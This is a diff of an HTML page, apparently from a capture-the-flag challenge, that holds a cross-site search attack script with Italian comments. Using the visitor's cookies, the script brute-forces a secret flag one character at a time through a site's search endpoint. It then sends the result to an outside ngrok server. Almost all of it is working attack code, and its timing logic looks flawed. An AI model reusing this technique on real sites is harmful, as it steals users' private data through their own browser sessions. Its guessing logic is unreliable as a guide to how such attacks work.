@@ -1,52 +1,52 @@
-<script>
-const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
-const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
-let currentFlag = 'flag{'; // Inizio della flag
-let position = 5; // Posizione successiva da testare
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rubare Flag</title>
+</head>
+<body>
+    <h1>Rubare la Flag dell'Architetto</h1>
+    <script>
+    const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
+    let currentFlag = 'flag{';
+    let position = 5;
 
-const testChar = (position) => {
-    if (position < 100) { // Limite superiore
-        for (let char of chars) {
-            const query = `${baseUrl}${currentFlag}${char}`;
-            fetch(query, {
-                method: 'GET',
-                credentials: 'include',
-                mode: 'no-cors'
-            })
-            .then(response => {
-                // Non possiamo accedere alla risposta, quindi facciamo affidamento sul comportamento
-                if (response.ok) {
+    const testChar = (position) => {
+        if (position < 100) {
+            for (let char of chars) {
+                const query = `${baseUrl}${currentFlag}${char}`;
+                const timeout = setTimeout(() => {
                     console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                    currentFlag += char; // Aggiungi carattere
-                    testChar(currentFlag.length); // Prossima posizione
-                    return; // Esci per evitare conflitti
-                } else {
-                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
-                }
+                    currentFlag += char;
+                    testChar(currentFlag.length);
+                }, 1000);  // Timeout di 1 secondo
+
+                fetch(query, {
+                    method: 'GET',
+                    credentials: 'include',
+                    mode: 'no-cors'
+                })
+                .then(() => clearTimeout(timeout))  // Se non ci sono errori, presumi che il carattere sia corretto
+                .catch(error => console.error('Errore nella richiesta:', error));
+            }
+        } else {
+            console.log(`Flag completa: ${currentFlag}`);
+            fetch('https://9e94-87-4-142-72.ngrok-free.app/receive_flag', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `flag=${encodeURIComponent(currentFlag)}`
             })
-            .catch(error => {
-                console.error('Errore nella richiesta:', error);
-            });
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Errore durante l\'invio della flag:', error));
         }
-    } else {
-        console.log(`Flag completa: ${currentFlag}`);
-        // Invia la flag al tuo server Flask
-        fetch('https://9e94-87-4-142-72.ngrok-free.app/receive_flag', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: `flag=${encodeURIComponent(currentFlag)}`
-        })
-        .then(response => response.text())
-        .then(data => console.log('Risposta dal server:', data))
-        .catch(error => console.error('Errore durante l\'invio della flag:', error));
-    }
-};
-
-// Inizia il test
-testChar(position);
-
-// Inizia il test
-testChar(position);
-</script>
+    };
+    
+    testChar(position);
+    </script>
+</body>
+</html>
